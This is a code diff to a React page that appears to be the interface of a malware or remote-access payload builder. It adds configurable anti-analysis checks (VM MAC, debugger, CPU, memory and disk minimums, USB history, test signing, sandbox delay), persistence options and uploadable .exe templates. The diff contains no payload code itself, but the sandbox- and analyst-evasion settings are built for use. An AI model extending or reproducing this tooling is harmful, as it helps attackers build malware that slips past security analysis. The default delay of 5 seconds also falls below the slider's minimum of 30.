@@ -1,12 +1,12 @@
 import { useState, useMemo, useRef, useEffect, useCallback } from 'react';
 import { useTranslation } from 'react-i18next';
-import { Button, Card, Input, Label, Modal, Popover, Slider, Spinner, Tabs, TextField } from '@heroui/react';
+import { Button, Card, Input, Label, Modal, Popover, Slider, Spinner, Switch, Tabs, TextField } from '@heroui/react';
 import { NumberField } from '@heroui/react/number-field';
 import { ListView } from '@components/list-view';
 import type { Selection } from 'react-aria-components';
-import { startBuild, uploadIcon, getBuildStreamUrl, listBuilds, deleteBuild, getBuildDownloadUrl, getBuildInfo } from '../../api/build';
-import type { BuildConfigRequest, BuildRecord, BuildRecordDetail } from '../../types/models';
-import { ArrowDownToLine, CircleCheck, CircleInfo, Picture, Shield, ToggleOff, ToggleOn, TrashBin } from '@gravity-ui/icons';
+import { startBuild, uploadIcon, getBuildStreamUrl, listBuilds, deleteBuild, getBuildDownloadUrl, getBuildInfo, listTemplates, uploadTemplate, deleteTemplate } from '../../api/build';
+import type { BuildConfigRequest, BuildRecord, BuildRecordDetail, TemplateInfo } from '../../types/models';
+import { ArrowDownToLine, CircleCheck, CircleInfo, Picture, Shield, TrashBin } from '@gravity-ui/icons';
 
 interface ToggleOption {
   id: string;
@@ -39,13 +39,19 @@ const DEFAULT_CONFIG: BuildConfigRequest = {
   antiAnalysis: {
     enabled: false,
     checkCpuCores: true,
+    minCpuCores: 2,
     checkMemory: true,
-    checkUptime: true,
-    checkDebugger: true,
-    checkParentProcess: true,
-    checkVmMac: true,
+    minMemoryGb: 2,
     checkDiskSize: true,
+    minDiskGb: 60,
+    checkDebugger: true,
+    checkVmMac: true,
     checkUsername: true,
+    checkUsbHistory: true,
+    minUsbDevices: 2,
+    checkTestSigning: true,
+    checkDelaySandbox: true,
+    delaySeconds: 5,
   },
 };
 
@@ -91,6 +97,11 @@ export default function BuilderPage() {
   const [selectedRecord, setSelectedRecord] = useState<BuildRecordDetail | null>(null);
   const [infoLoading, setInfoLoading] = useState(false);
 
+  // Templates
+  const [templates, setTemplates] = useState<TemplateInfo[]>([]);
+  const [templateUploading, setTemplateUploading] = useState(false);
+  const templateFileRef = useRef<HTMLInputElement>(null);
+
   const loadHistory = useCallback(async () => {
     try {
       const items = await listBuilds();
@@ -98,7 +109,14 @@ export default function BuilderPage() {
     } catch { /* ignore */ }
   }, []);
 
-  useEffect(() => { loadHistory(); }, [loadHistory]);
+  const loadTemplates = useCallback(async () => {
+    try {
+      const items = await listTemplates();
+      setTemplates(Array.isArray(items) ? items : []);
+    } catch { /* ignore */ }
+  }, []);
+
+  useEffect(() => { loadHistory(); loadTemplates(); }, [loadHistory, loadTemplates]);
 
   const set = <K extends keyof BuildConfigRequest>(key: K, value: BuildConfigRequest[K]) =>
     setConfig((c) => ({ ...c, [key]: value }));
@@ -118,12 +136,13 @@ export default function BuilderPage() {
   const antiAnalysisOptions: AntiAnalysisToggle[] = useMemo(() => [
     { id: 'checkCpuCores', key: 'checkCpuCores' },
     { id: 'checkMemory', key: 'checkMemory' },
-    { id: 'checkUptime', key: 'checkUptime' },
-    { id: 'checkDebugger', key: 'checkDebugger' },
-    { id: 'checkParentProcess', key: 'checkParentProcess' },
-    { id: 'checkVmMac', key: 'checkVmMac' },
     { id: 'checkDiskSize', key: 'checkDiskSize' },
+    { id: 'checkUsbHistory', key: 'checkUsbHistory' },
+    { id: 'checkDelaySandbox', key: 'checkDelaySandbox' },
+    { id: 'checkDebugger', key: 'checkDebugger' },
+    { id: 'checkVmMac', key: 'checkVmMac' },
     { id: 'checkUsername', key: 'checkUsername' },
+    { id: 'checkTestSigning', key: 'checkTestSigning' },
   ], []);
 
   const selectedBuildKeys = useMemo(
@@ -159,13 +178,17 @@ export default function BuilderPage() {
     const s = keys as Set<string>;
     const updated = { ...config.antiAnalysis };
     for (const opt of antiAnalysisOptions) {
-      updated[opt.key] = s.has(opt.id);
+      (updated as any)[opt.key] = s.has(opt.id);
     }
     setConfig((c) => ({ ...c, antiAnalysis: updated }));
   };
 
   const toggleAntiAnalysis = () => {
     setConfig((c) => ({ ...c, antiAnalysis: { ...c.antiAnalysis, enabled: !c.antiAnalysis.enabled } }));
+  };
+
+  const setAntiAnalysis = <K extends keyof BuildConfigRequest['antiAnalysis']>(key: K, value: BuildConfigRequest['antiAnalysis'][K]) => {
+    setConfig((c) => ({ ...c, antiAnalysis: { ...c.antiAnalysis, [key]: value } }));
   };
 
   const handleIconUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -186,6 +209,31 @@ export default function BuilderPage() {
     } finally {
       setIconUploading(false);
     }
+  };
+
+  const handleTemplateUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    setTemplateUploading(true);
+    try {
+      await uploadTemplate(file, config.platform);
+      await loadTemplates();
+    } catch { /* ignore */ }
+    finally { setTemplateUploading(false); }
+    if (templateFileRef.current) templateFileRef.current.value = '';
+  };
+
+  const handleDeleteTemplate = async (platform: string) => {
+    if (!confirm(t('builder.deleteTemplateConfirm'))) return;
+    try {
+      await deleteTemplate(platform);
+      await loadTemplates();
+    } catch { /* ignore */ }
+  };
+
+  const handleRebuildFromTemplate = (platform: string) => {
+    setConfig((c) => ({ ...c, platform }));
+    setTimeout(() => handleBuild(), 0);
   };
 
   const handleBuild = async () => {
@@ -465,8 +513,8 @@ export default function BuilderPage() {
           </div>
         </Card>
 
-        {/* Build options + Persistence + Anti-Analysis */}
-        <div className="grid grid-cols-3 gap-4">
+        {/* Build options + Persistence */}
+        <div className="grid grid-cols-2 gap-4">
           <Card className="p-4">
             <h2 className="text-lg font-semibold mb-3">{t('builder.buildOptions')}</h2>
             <ListView
@@ -551,6 +599,7 @@ export default function BuilderPage() {
               )}
             </ListView>
           </Card>
+        </div>
 
           <Card className="p-4">
             <div className="flex items-center justify-between mb-3">
@@ -558,47 +607,75 @@ export default function BuilderPage() {
                 <Shield className="w-5 h-5" />
                 {t('builder.antiAnalysis')}
               </h2>
-              <Button
-                variant={config.antiAnalysis.enabled ? 'primary' : 'secondary'}
-                onPress={toggleAntiAnalysis}
-              >
-                {config.antiAnalysis.enabled ? <ToggleOn /> : <ToggleOff />}
-                {config.antiAnalysis.enabled ? t('common.yes') : t('common.no')}
-              </Button>
+              <Switch isSelected={config.antiAnalysis.enabled} onChange={toggleAntiAnalysis}>
+                <Switch.Control>
+                  <Switch.Thumb />
+                </Switch.Control>
+              </Switch>
             </div>
             {config.antiAnalysis.enabled && (
-              <ListView
-                aria-label={t('builder.antiAnalysis')}
-                items={antiAnalysisOptions}
-                selectedKeys={selectedAntiAnalysisKeys}
-                selectionMode="multiple"
-                variant="primary"
-                onSelectionChange={handleAntiAnalysisSelectionChange}
-              >
-                {(opt) => (
-                  <ListView.Item id={opt.id} textValue={t(`builder.${opt.id}`)}>
-                    <ListView.ItemContent>
-                      <div className="flex items-center justify-between w-full">
-                        <ListView.Title>{t(`builder.${opt.id}`)}</ListView.Title>
-                        <Popover>
-                          <Button isIconOnly variant="ghost" className="h-8 w-8 min-w-0">
-                            <CircleInfo className="h-6 w-6" />
-                          </Button>
-                          <Popover.Content className="max-w-64">
-                            <Popover.Dialog>
-                              <Popover.Heading className="text-sm">{t(`builder.${opt.id}`)}</Popover.Heading>
-                              <p className="mt-1 text-xs text-default-500">{t(`builder.${opt.id}Desc`)}</p>
-                            </Popover.Dialog>
-                          </Popover.Content>
-                        </Popover>
-                      </div>
-                    </ListView.ItemContent>
-                  </ListView.Item>
-                )}
-              </ListView>
+              <div className="flex gap-4">
+                <div className="flex-1 min-w-0">
+                  <ListView
+                    aria-label={t('builder.antiAnalysis')}
+                    items={antiAnalysisOptions}
+                    selectedKeys={selectedAntiAnalysisKeys}
+                    selectionMode="multiple"
+                    variant="primary"
+                    onSelectionChange={handleAntiAnalysisSelectionChange}
+                  >
+                    {(opt) => (
+                      <ListView.Item id={opt.id} textValue={t(`builder.${opt.id}`)}>
+                        <ListView.ItemContent>
+                          <div className="flex items-center justify-between w-full">
+                            <ListView.Title>{t(`builder.${opt.id}`)}</ListView.Title>
+                            <Popover>
+                              <Button isIconOnly variant="ghost" className="h-8 w-8 min-w-0">
+                                <CircleInfo className="h-6 w-6" />
+                              </Button>
+                              <Popover.Content className="max-w-64">
+                                <Popover.Dialog>
+                                  <Popover.Heading className="text-sm">{t(`builder.${opt.id}`)}</Popover.Heading>
+                                  <p className="mt-1 text-xs text-default-500">{t(`builder.${opt.id}Desc`)}</p>
+                                </Popover.Dialog>
+                              </Popover.Content>
+                            </Popover>
+                          </div>
+                        </ListView.ItemContent>
+                      </ListView.Item>
+                    )}
+                  </ListView>
+                </div>
+                <div className="w-56 shrink-0 space-y-3 pt-1">
+                  <Slider aria-label={t('builder.minCpuCores')} isDisabled={!config.antiAnalysis.checkCpuCores} className="w-full" value={config.antiAnalysis.minCpuCores} minValue={1} maxValue={16} step={1} onChange={(v) => setAntiAnalysis('minCpuCores', (Array.isArray(v) ? v[0] : v) as number)}>
+                    <Label>{t('builder.minCpuCores')}</Label>
+                    <Slider.Output />
+                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
+                  </Slider>
+                  <Slider aria-label={t('builder.minMemoryGb')} isDisabled={!config.antiAnalysis.checkMemory} className="w-full" value={config.antiAnalysis.minMemoryGb} minValue={1} maxValue={32} step={1} onChange={(v) => setAntiAnalysis('minMemoryGb', (Array.isArray(v) ? v[0] : v) as number)}>
+                    <Label>{t('builder.minMemoryGb')}</Label>
+                    <Slider.Output />
+                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
+                  </Slider>
+                  <Slider aria-label={t('builder.minDiskGb')} isDisabled={!config.antiAnalysis.checkDiskSize} className="w-full" value={config.antiAnalysis.minDiskGb} minValue={20} maxValue={500} step={10} onChange={(v) => setAntiAnalysis('minDiskGb', (Array.isArray(v) ? v[0] : v) as number)}>
+                    <Label>{t('builder.minDiskGb')}</Label>
+                    <Slider.Output />
+                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
+                  </Slider>
+                  <Slider aria-label={t('builder.minUsbDevices')} isDisabled={!config.antiAnalysis.checkUsbHistory} className="w-full" value={config.antiAnalysis.minUsbDevices} minValue={1} maxValue={10} step={1} onChange={(v) => setAntiAnalysis('minUsbDevices', (Array.isArray(v) ? v[0] : v) as number)}>
+                    <Label>{t('builder.minUsbDevices')}</Label>
+                    <Slider.Output />
+                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
+                  </Slider>
+                  <Slider aria-label={t('builder.delaySeconds')} isDisabled={!config.antiAnalysis.checkDelaySandbox} className="w-full" value={config.antiAnalysis.delaySeconds} minValue={30} maxValue={180} step={1} onChange={(v) => setAntiAnalysis('delaySeconds', (Array.isArray(v) ? v[0] : v) as number)}>
+                    <Label>{t('builder.delaySeconds')}</Label>
+                    <Slider.Output />
+                    <Slider.Track><Slider.Fill /><Slider.Thumb /></Slider.Track>
+                  </Slider>
+                </div>
+              </div>
             )}
           </Card>
-        </div>
 
       </div>
 
@@ -674,6 +751,73 @@ export default function BuilderPage() {
                       </div>
                     </ListView.ItemAction>
                   )}
+                </ListView.Item>
+              )}
+            </ListView>
+          )}
+        </Card>
+
+        <Card className="p-4 mt-4">
+          <div className="flex items-center justify-between mb-3">
+            <h2 className="text-lg font-semibold">{t('builder.templates')}</h2>
+            <Button
+              size="sm"
+              variant="ghost"
+              isDisabled={templateUploading}
+              onPress={() => templateFileRef.current?.click()}
+            >
+              {templateUploading ? <Spinner className="w-3 h-3 mr-1" /> : null}
+              {t('builder.uploadTemplate')}
+            </Button>
+          </div>
+          <input
+            title={t('builder.uploadTemplate')}
+            ref={templateFileRef}
+            type="file"
+            accept=".exe,application/octet-stream"
+            className="hidden"
+            onChange={handleTemplateUpload}
+          />
+          {templates.length === 0 ? (
+            <p className="text-sm text-default-500 py-4 text-center">{t('builder.noTemplates')}</p>
+          ) : (
+            <ListView
+              aria-label={t('builder.templates')}
+              items={templates}
+              selectionMode="none"
+              variant="primary"
+            >
+              {(tpl: TemplateInfo) => (
+                <ListView.Item id={tpl.platform} textValue={tpl.platform}>
+                  <ListView.ItemContent>
+                    <ListView.Title>
+                      <span className="text-sm font-medium">{PLATFORM_LABEL[tpl.platform] || tpl.platform}</span>
+                    </ListView.Title>
+                    <ListView.Description>
+                      <span className="text-xs">{tpl.fileName} — {formatSize(tpl.fileSize)}</span>
+                    </ListView.Description>
+                  </ListView.ItemContent>
+                  <ListView.ItemAction>
+                    <div className="flex gap-1">
+                      <Button
+                        size="sm"
+                        variant="ghost"
+                        onPress={() => handleRebuildFromTemplate(tpl.platform)}
+                        isDisabled={building}
+                      >
+                        {t('builder.rebuildTemplate')}
+                      </Button>
+                      <Button
+                        size="sm"
+                        variant="ghost"
+                        isIconOnly
+                        aria-label={t('builder.deleteTemplate')}
+                        onPress={() => handleDeleteTemplate(tpl.platform)}
+                      >
+                        <TrashBin className="w-4 h-4 text-danger" />
+                      </Button>
+                    </div>
+                  </ListView.ItemAction>
                 </ListView.Item>
               )}
             </ListView>
